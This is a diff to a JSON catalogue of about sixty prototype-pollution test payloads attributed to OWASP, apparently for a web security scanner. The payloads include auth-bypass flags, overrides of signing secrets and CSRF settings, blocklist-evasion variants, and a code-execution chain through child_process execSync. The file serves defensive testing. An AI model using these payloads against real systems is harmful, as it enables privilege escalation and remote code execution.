@@ -3,711 +3,474 @@
     "id": "prototype-pollution-owasp-0001",
     "name": "Basic __proto__ injection (JSON body)",
     "template": "{\"__proto__\": {\"polluted\": true}}",
-    "description": "Basic __proto__ injection (JSON body) probe from OWASP. Tests application handling of: {\"__proto__\": {\"polluted\": tru...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Basic __proto__ injection (JSON body) probe from OWASP. Tests application handling of: {\"__proto__\": {\"polluted\": tru..."
   },
   {
     "id": "prototype-pollution-owasp-0002",
     "name": "Basic __proto__ injection (JSON body) #2",
     "template": "{\"__proto__\": {\"admin\": true}}",
-    "description": "Basic __proto__ injection (JSON body) probe from OWASP. Tests application handling of: {\"__proto__\": {\"admin\": true}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Basic __proto__ injection (JSON body) probe from OWASP. Tests application handling of: {\"__proto__\": {\"admin\": true}}"
   },
   {
     "id": "prototype-pollution-owasp-0003",
     "name": "Basic __proto__ injection (JSON body) #3",
     "template": "{\"__proto__\": {\"isAdmin\": true}}",
-    "description": "Basic __proto__ injection (JSON body) probe from OWASP. Tests application handling of: {\"__proto__\": {\"isAdmin\": true...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Basic __proto__ injection (JSON body) probe from OWASP. Tests application handling of: {\"__proto__\": {\"isAdmin\": true..."
   },
   {
     "id": "prototype-pollution-owasp-0004",
     "name": "Nested __proto__ via merge utilities",
     "template": "{\"a\": {\"__proto__\": {\"polluted\": true}}}",
-    "description": "Nested __proto__ via merge utilities probe from OWASP. Tests application handling of: {\"a\": {\"__proto__\": {\"polluted...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Nested __proto__ via merge utilities probe from OWASP. Tests application handling of: {\"a\": {\"__proto__\": {\"polluted..."
   },
   {
     "id": "prototype-pollution-owasp-0005",
     "name": "Nested __proto__ via merge utilities #2",
     "template": "{\"user\": {\"__proto__\": {\"role\": \"admin\"}}}",
-    "description": "Nested __proto__ via merge utilities probe from OWASP. Tests application handling of: {\"user\": {\"__proto__\": {\"role\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Nested __proto__ via merge utilities probe from OWASP. Tests application handling of: {\"user\": {\"__proto__\": {\"role\"..."
   },
   {
     "id": "prototype-pollution-owasp-0006",
     "name": "Nested __proto__ via merge utilities #3",
     "template": "{\"data\": {\"__proto__\": {\"authenticated\": true}}}",
-    "description": "Nested __proto__ via merge utilities probe from OWASP. Tests application handling of: {\"data\": {\"__proto__\": {\"authe...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Nested __proto__ via merge utilities probe from OWASP. Tests application handling of: {\"data\": {\"__proto__\": {\"authe..."
   },
   {
     "id": "prototype-pollution-owasp-0007",
     "name": "constructor.prototype climbing",
     "template": "{\"constructor\": {\"prototype\": {\"polluted\": true}}}",
-    "description": "constructor.prototype climbing probe from OWASP. Tests application handling of: {\"constructor\": {\"prototype\": ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "constructor.prototype climbing probe from OWASP. Tests application handling of: {\"constructor\": {\"prototype\": ..."
   },
   {
     "id": "prototype-pollution-owasp-0008",
     "name": "constructor.prototype climbing #2",
     "template": "{\"x\": {\"constructor\": {\"prototype\": {\"admin\": true}}}}",
-    "description": "constructor.prototype climbing probe from OWASP. Tests application handling of: {\"x\": {\"constructor\": {\"protot...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "constructor.prototype climbing probe from OWASP. Tests application handling of: {\"x\": {\"constructor\": {\"protot..."
   },
   {
     "id": "prototype-pollution-owasp-0009",
     "name": "constructor.prototype climbing #3",
     "template": "{\"a\": {\"b\": {\"constructor\": {\"prototype\": {\"isAdmin\": true}}}}}",
-    "description": "constructor.prototype climbing probe from OWASP. Tests application handling of: {\"a\": {\"b\": {\"constructor\": {\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "constructor.prototype climbing probe from OWASP. Tests application handling of: {\"a\": {\"b\": {\"constructor\": {\"..."
   },
   {
     "id": "prototype-pollution-owasp-0010",
     "name": "prototype key pollution (dotted / bracketed)",
     "template": "{\"prototype\": {\"polluted\": true}}",
-    "description": "prototype key pollution (dotted / bracketed) probe from OWASP. Tests application handling of: {\"prototype\": {\"polluted\": tru...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "prototype key pollution (dotted / bracketed) probe from OWASP. Tests application handling of: {\"prototype\": {\"polluted\": tru..."
   },
   {
     "id": "prototype-pollution-owasp-0011",
     "name": "prototype key pollution (dotted / bracketed) #2",
     "template": "{\"a\": {\"prototype\": {\"role\": \"admin\"}}}",
-    "description": "prototype key pollution (dotted / bracketed) probe from OWASP. Tests application handling of: {\"a\": {\"prototype\": {\"role\": \"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "prototype key pollution (dotted / bracketed) probe from OWASP. Tests application handling of: {\"a\": {\"prototype\": {\"role\": \"..."
   },
   {
     "id": "prototype-pollution-owasp-0012",
     "name": "Query string / URL-encoded injection",
     "template": "?__proto__[polluted]=true",
-    "description": "Query string / URL-encoded injection probe from OWASP. Tests application handling of: ?__proto__[polluted]=true",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Query string / URL-encoded injection probe from OWASP. Tests application handling of: ?__proto__[polluted]=true"
   },
   {
     "id": "prototype-pollution-owasp-0013",
     "name": "Query string / URL-encoded injection #2",
     "template": "?__proto__[admin]=true",
-    "description": "Query string / URL-encoded injection probe from OWASP. Tests application handling of: ?__proto__[admin]=true",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Query string / URL-encoded injection probe from OWASP. Tests application handling of: ?__proto__[admin]=true"
   },
   {
     "id": "prototype-pollution-owasp-0014",
     "name": "Query string / URL-encoded injection #3",
     "template": "?constructor[prototype][polluted]=true",
-    "description": "Query string / URL-encoded injection probe from OWASP. Tests application handling of: ?constructor[prototype][pollut...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Query string / URL-encoded injection probe from OWASP. Tests application handling of: ?constructor[prototype][pollut..."
   },
   {
     "id": "prototype-pollution-owasp-0015",
     "name": "Query string / URL-encoded injection #4",
     "template": "?__proto__.polluted=true",
-    "description": "Query string / URL-encoded injection probe from OWASP. Tests application handling of: ?__proto__.polluted=true",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Query string / URL-encoded injection probe from OWASP. Tests application handling of: ?__proto__.polluted=true"
   },
   {
     "id": "prototype-pollution-owasp-0016",
     "name": "Query string / URL-encoded injection #5",
     "template": "?__proto__[isAdmin]=true&__proto__[role]=admin",
-    "description": "Query string / URL-encoded injection probe from OWASP. Tests application handling of: ?__proto__[isAdmin]=true&__pro...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Query string / URL-encoded injection probe from OWASP. Tests application handling of: ?__proto__[isAdmin]=true&__pro..."
   },
   {
     "id": "prototype-pollution-owasp-0017",
     "name": "Array / bracket notation forms",
     "template": "{\"__proto__\":[{\"polluted\":true}]}",
-    "description": "Array / bracket notation forms probe from OWASP. Tests application handling of: {\"__proto__\":[{\"polluted\":true...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Array / bracket notation forms probe from OWASP. Tests application handling of: {\"__proto__\":[{\"polluted\":true..."
   },
   {
     "id": "prototype-pollution-owasp-0018",
     "name": "Array / bracket notation forms #2",
     "template": "{\"__proto__\":[\"polluted\"]}",
-    "description": "Array / bracket notation forms probe from OWASP. Tests application handling of: {\"__proto__\":[\"polluted\"]}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Array / bracket notation forms probe from OWASP. Tests application handling of: {\"__proto__\":[\"polluted\"]}"
   },
   {
     "id": "prototype-pollution-owasp-0019",
     "name": "Array / bracket notation forms #3",
     "template": "{\"__proto__\": {\"x\": \"y\"}, \"normal\": \"value\"}",
-    "description": "Array / bracket notation forms probe from OWASP. Tests application handling of: {\"__proto__\": {\"x\": \"y\"}, \"nor...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Array / bracket notation forms probe from OWASP. Tests application handling of: {\"__proto__\": {\"x\": \"y\"}, \"nor..."
   },
   {
     "id": "prototype-pollution-owasp-0020",
     "name": "Deep nested pollution in recursive merges",
     "template": "{\"a\": {\"b\": {\"c\": {\"__proto__\": {\"polluted\": true}}}}}",
-    "description": "Deep nested pollution in recursive merges probe from OWASP. Tests application handling of: {\"a\": {\"b\": {\"c\": {\"__proto__\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Deep nested pollution in recursive merges probe from OWASP. Tests application handling of: {\"a\": {\"b\": {\"c\": {\"__proto__\"..."
   },
   {
     "id": "prototype-pollution-owasp-0021",
     "name": "Deep nested pollution in recursive merges #2",
     "template": "{\"level1\": {\"level2\": {\"level3\": {\"__proto__\": {\"admin\": true}}}}}",
-    "description": "Deep nested pollution in recursive merges probe from OWASP. Tests application handling of: {\"level1\": {\"level2\": {\"level3...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Deep nested pollution in recursive merges probe from OWASP. Tests application handling of: {\"level1\": {\"level2\": {\"level3..."
   },
   {
     "id": "prototype-pollution-owasp-0022",
     "name": "DOM / clientside pollution (browser location / postMessage)",
     "template": "?__proto__[polluted]=true  (reflected into Object.prototype via unsafe parse)",
-    "description": "DOM / clientside pollution (browser location / postMessage) probe from OWASP. Tests application handling of: ?__proto__[polluted]=true  (re...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "DOM / clientside pollution (browser location / postMessage) probe from OWASP. Tests application handling of: ?__proto__[polluted]=true  (re..."
   },
   {
     "id": "prototype-pollution-owasp-0023",
     "name": "DOM / clientside pollution (browser location / postMessage) #2",
     "template": "<script>location.hash = '#__proto__[polluted]=true'</script>",
-    "description": "DOM / clientside pollution (browser location / postMessage) probe from OWASP. Tests application handling of: <script>location.hash = '#__pr...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "DOM / clientside pollution (browser location / postMessage) probe from OWASP. Tests application handling of: <script>location.hash = '#__pr..."
   },
   {
     "id": "prototype-pollution-owasp-0024",
     "name": "DOM / clientside pollution (browser location / postMessage) #3",
     "template": "postMessage({\"__proto__\":{\"polluted\":true}}, \"*\")",
-    "description": "DOM / clientside pollution (browser location / postMessage) probe from OWASP. Tests application handling of: postMessage({\"__proto__\":{\"pol...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "DOM / clientside pollution (browser location / postMessage) probe from OWASP. Tests application handling of: postMessage({\"__proto__\":{\"pol..."
   },
   {
     "id": "prototype-pollution-owasp-0025",
     "name": "Pollution reaching dangerous sinks (examples of impact ch...",
     "template": "{\"__proto__\": {\"env\": \"production\"}}        # override environment config",
-    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"env\": \"product...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"env\": \"product..."
   },
   {
     "id": "prototype-pollution-owasp-0026",
     "name": "Pollution reaching dangerous sinks (examples of impact chains) #2",
     "template": "{\"__proto__\": {\"NODE_ENV\": \"test\"}}         # change runtime mode",
-    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"NODE_ENV\": \"te...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"NODE_ENV\": \"te..."
   },
   {
     "id": "prototype-pollution-owasp-0027",
     "name": "Pollution reaching dangerous sinks (examples of impact chains) #3",
     "template": "{\"__proto__\": {\"template\": \"malicious\"}}    # template name used by renderer",
-    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"template\": \"ma...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"template\": \"ma..."
   },
   {
     "id": "prototype-pollution-owasp-0028",
     "name": "Pollution reaching dangerous sinks (examples of impact chains) #4",
     "template": "{\"__proto__\": {\"shell\": \"/bin/sh\"}}         # argument consumed by exec wrapper",
-    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"shell\": \"/bin/...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"shell\": \"/bin/..."
   },
   {
     "id": "prototype-pollution-owasp-0029",
     "name": "Pollution reaching dangerous sinks (examples of impact chains) #5",
     "template": "{\"__proto__\": {\"transport\": \"file\"}}        # alter module/transport selection",
-    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"transport\": \"f...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"transport\": \"f..."
   },
   {
     "id": "prototype-pollution-owasp-0030",
     "name": "Pollution reaching dangerous sinks (examples of impact chains) #6",
     "template": "{\"__proto__\": {\"outputFunctionName\": \"a=1;process.mainModule.require('child_process').execSync('id')\"}}",
-    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"outputFunction...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Pollution reaching dangerous sinks (examples of impact chains) probe from OWASP. Tests application handling of: {\"__proto__\": {\"outputFunction..."
   },
   {
     "id": "prototype-pollution-owasp-0031",
     "name": "Known vulnerable library merge sinks (context)",
     "template": "_.merge(target, payload)            # lodash < 4.17.12 (CVE-2019-10744)",
-    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: _.merge(target, payload)      ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: _.merge(target, payload)      ..."
   },
   {
     "id": "prototype-pollution-owasp-0032",
     "name": "Known vulnerable library merge sinks (context) #2",
     "template": "_.defaultsDeep(target, payload)     # lodash (CVE-2019-10744)",
-    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: _.defaultsDeep(target, payload...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: _.defaultsDeep(target, payload..."
   },
   {
     "id": "prototype-pollution-owasp-0033",
     "name": "Known vulnerable library merge sinks (context) #3",
     "template": "$.extend(true, target, payload)     # jQuery < 3.4.0 (CVE-2019-11358)",
-    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: $.extend(true, target, payload...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: $.extend(true, target, payload..."
   },
   {
     "id": "prototype-pollution-owasp-0034",
     "name": "Known vulnerable library merge sinks (context) #4",
     "template": "extend(true, target, payload)       # npm 'extend' < 3.0.2 (CVE-2018-16492)",
-    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: extend(true, target, payload) ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: extend(true, target, payload) ..."
   },
   {
     "id": "prototype-pollution-owasp-0035",
     "name": "Known vulnerable library merge sinks (context) #5",
     "template": "merge.deep(target, payload)         # 'merge' < 2.1.1 (CVE-2019-12629)",
-    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: merge.deep(target, payload)   ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: merge.deep(target, payload)   ..."
   },
   {
     "id": "prototype-pollution-owasp-0036",
     "name": "Known vulnerable library merge sinks (context) #6",
     "template": "hoek.applyToDefaults(defaults, payload)  # '@hapi/hoek' < 8.1.2 (CVE-2020-11618)",
-    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: hoek.applyToDefaults(defaults,...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Known vulnerable library merge sinks (context) probe from OWASP. Tests application handling of: hoek.applyToDefaults(defaults,..."
   },
   {
     "id": "prototype-pollution-owasp-0037",
     "name": "Pollution via YAML / unsafe parsers",
     "template": "__proto__:",
-    "description": "Pollution via YAML / unsafe parsers probe from OWASP. Tests application handling of: __proto__:",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Pollution via YAML / unsafe parsers probe from OWASP. Tests application handling of: __proto__:"
   },
   {
     "id": "prototype-pollution-owasp-0038",
     "name": "Pollution via YAML / unsafe parsers #2",
     "template": "polluted: true",
-    "description": "Pollution via YAML / unsafe parsers probe from OWASP. Tests application handling of: polluted: true",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Pollution via YAML / unsafe parsers probe from OWASP. Tests application handling of: polluted: true"
   },
   {
     "id": "prototype-pollution-owasp-0039",
     "name": "Pollution via YAML / unsafe parsers #3",
     "template": "constructor:",
-    "description": "Pollution via YAML / unsafe parsers probe from OWASP. Tests application handling of: constructor:",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Pollution via YAML / unsafe parsers probe from OWASP. Tests application handling of: constructor:"
   },
   {
     "id": "prototype-pollution-owasp-0040",
     "name": "Pollution via YAML / unsafe parsers #4",
     "template": "prototype:",
-    "description": "Pollution via YAML / unsafe parsers probe from OWASP. Tests application handling of: prototype:",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Pollution via YAML / unsafe parsers probe from OWASP. Tests application handling of: prototype:"
   },
   {
     "id": "prototype-pollution-owasp-0041",
     "name": "Pollution via YAML / unsafe parsers #5",
     "template": "admin: true",
-    "description": "Pollution via YAML / unsafe parsers probe from OWASP. Tests application handling of: admin: true",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Pollution via YAML / unsafe parsers probe from OWASP. Tests application handling of: admin: true"
   },
   {
     "id": "prototype-pollution-owasp-0042",
     "name": "Bypasses for naive blocklists",
     "template": "{\"__proto__ \": {\"polluted\": true}}      # trailing space evades strict '== \"__proto__\"'",
-    "description": "Bypasses for naive blocklists probe from OWASP. Tests application handling of: {\"__proto__ \": {\"polluted\": tr...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Bypasses for naive blocklists probe from OWASP. Tests application handling of: {\"__proto__ \": {\"polluted\": tr..."
   },
   {
     "id": "prototype-pollution-owasp-0043",
     "name": "Bypasses for naive blocklists #2",
     "template": "{\"__proto__\\t\": {\"polluted\": true}}     # tab in key",
-    "description": "Bypasses for naive blocklists probe from OWASP. Tests application handling of: {\"__proto__\\t\": {\"polluted\": t...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Bypasses for naive blocklists probe from OWASP. Tests application handling of: {\"__proto__\\t\": {\"polluted\": t..."
   },
   {
     "id": "prototype-pollution-owasp-0044",
     "name": "Bypasses for naive blocklists #3",
     "template": "{\"constructor.prototype\": {\"polluted\": true}}",
-    "description": "Bypasses for naive blocklists probe from OWASP. Tests application handling of: {\"constructor.prototype\": {\"po...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Bypasses for naive blocklists probe from OWASP. Tests application handling of: {\"constructor.prototype\": {\"po..."
   },
   {
     "id": "prototype-pollution-owasp-0045",
     "name": "Bypasses for naive blocklists #4",
     "template": "{\"this.__proto__\": {\"polluted\": true}}",
-    "description": "Bypasses for naive blocklists probe from OWASP. Tests application handling of: {\"this.__proto__\": {\"polluted\"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Bypasses for naive blocklists probe from OWASP. Tests application handling of: {\"this.__proto__\": {\"polluted\"..."
   },
   {
     "id": "prototype-pollution-owasp-0046",
     "name": "Detection probes (safe, non-destructive)",
     "template": "{\"__proto__\": {\"__pollution_test__\": \"x\"}}",
-    "description": "Detection probes (safe, non-destructive) probe from OWASP. Tests application handling of: {\"__proto__\": {\"__pollution_te...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Detection probes (safe, non-destructive) probe from OWASP. Tests application handling of: {\"__proto__\": {\"__pollution_te..."
   },
   {
     "id": "prototype-pollution-owasp-0047",
     "name": "JSON with escaped unicode keys",
     "template": "{\"\\u005f\\u005fproto\\u005f\\u005f\": {\"polluted\": true}}",
-    "description": "JSON with escaped unicode keys probe from OWASP. Tests application handling of: {\"\\u005f\\u005fproto\\u005f\\u005...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "JSON with escaped unicode keys probe from OWASP. Tests application handling of: {\"\\u005f\\u005fproto\\u005f\\u005..."
   },
   {
     "id": "prototype-pollution-owasp-0048",
     "name": "Multipart / form-encoded variants",
     "template": "__proto__[polluted]=true",
-    "description": "Multipart / form-encoded variants probe from OWASP. Tests application handling of: __proto__[polluted]=true",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Multipart / form-encoded variants probe from OWASP. Tests application handling of: __proto__[polluted]=true"
   },
   {
     "id": "prototype-pollution-owasp-0049",
     "name": "Multipart / form-encoded variants #2",
     "template": "constructor[prototype][polluted]=true",
-    "description": "Multipart / form-encoded variants probe from OWASP. Tests application handling of: constructor[prototype][pollute...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Multipart / form-encoded variants probe from OWASP. Tests application handling of: constructor[prototype][pollute..."
   },
   {
     "id": "prototype-pollution-owasp-0050",
     "name": "Nested object with mixed safe + malicious keys",
     "template": "{\"name\": \"legit\", \"__proto__\": {\"polluted\": true}}",
-    "description": "Nested object with mixed safe + malicious keys probe from OWASP. Tests application handling of: {\"name\": \"legit\", \"__proto__\":...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Nested object with mixed safe + malicious keys probe from OWASP. Tests application handling of: {\"name\": \"legit\", \"__proto__\":..."
   },
   {
     "id": "prototype-pollution-owasp-0051",
     "name": "Polluted property used as a boolean ACL flag (common impact)",
     "template": "{\"__proto__\": {\"allowAdmin\": true}}",
-    "description": "Polluted property used as a boolean ACL flag (common impact) probe from OWASP. Tests application handling of: {\"__proto__\": {\"allowAdmin\": t...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Polluted property used as a boolean ACL flag (common impact) probe from OWASP. Tests application handling of: {\"__proto__\": {\"allowAdmin\": t..."
   },
   {
     "id": "prototype-pollution-owasp-0052",
     "name": "Polluted property used as a boolean ACL flag (common impact) #2",
     "template": "{\"__proto__\": {\"canEdit\": true}}",
-    "description": "Polluted property used as a boolean ACL flag (common impact) probe from OWASP. Tests application handling of: {\"__proto__\": {\"canEdit\": true...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Polluted property used as a boolean ACL flag (common impact) probe from OWASP. Tests application handling of: {\"__proto__\": {\"canEdit\": true..."
   },
   {
     "id": "prototype-pollution-owasp-0053",
     "name": "Polluted property used as a boolean ACL flag (common impact) #3",
     "template": "{\"__proto__\": {\"bypassAuth\": true}}",
-    "description": "Polluted property used as a boolean ACL flag (common impact) probe from OWASP. Tests application handling of: {\"__proto__\": {\"bypassAuth\": t...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Polluted property used as a boolean ACL flag (common impact) probe from OWASP. Tests application handling of: {\"__proto__\": {\"bypassAuth\": t..."
   },
   {
     "id": "prototype-pollution-owasp-0054",
     "name": "Property overrides reaching security-critical defaults",
     "template": "{\"__proto__\": {\"secret\": \"attacker-controlled\"}}   # override HMAC/session signing secret",
-    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"secret\": \"atta...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"secret\": \"atta..."
   },
   {
     "id": "prototype-pollution-owasp-0055",
     "name": "Property overrides reaching security-critical defaults #2",
     "template": "{\"__proto__\": {\"sessionKey\": \"attacker-controlled\"}}",
-    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"sessionKey\": \"...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"sessionKey\": \"..."
   },
   {
     "id": "prototype-pollution-owasp-0056",
     "name": "Property overrides reaching security-critical defaults #3",
     "template": "{\"__proto__\": {\"cookie\": \"admin=1\"}}               # inject cookie parsed into config",
-    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"cookie\": \"admi...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"cookie\": \"admi..."
   },
   {
     "id": "prototype-pollution-owasp-0057",
     "name": "Property overrides reaching security-critical defaults #4",
     "template": "{\"__proto__\": {\"csrf\": false}}                      # disable CSRF protection",
-    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"csrf\": false}}...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"csrf\": false}}..."
   },
   {
     "id": "prototype-pollution-owasp-0058",
     "name": "Property overrides reaching security-critical defaults #5",
     "template": "{\"__proto__\": {\"salt\": \"known-value\"}}             # weaken password hashing",
-    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"salt\": \"known-...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"salt\": \"known-..."
   },
   {
     "id": "prototype-pollution-owasp-0059",
     "name": "Property overrides reaching security-critical defaults #6",
     "template": "{\"__proto__\": {\"secure\": false}}                   # force insecure cookie flag off",
-    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"secure\": false...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Property overrides reaching security-critical defaults probe from OWASP. Tests application handling of: {\"__proto__\": {\"secure\": false..."
   },
   {
     "id": "prototype-pollution-owasp-0060",
     "name": "Deeper constructor climbing (constructor.constructor)",
     "template": "{\"constructor\": {\"prototype\": {\"constructor\": {\"prototype\": {\"polluted\": true}}}}}",
-    "description": "Deeper constructor climbing (constructor.constructor) probe from OWASP. Tests application handling of: {\"constructor\": {\"prototype\": ...",
-    "enabled": true,
-    "sourceType": "OWASP",
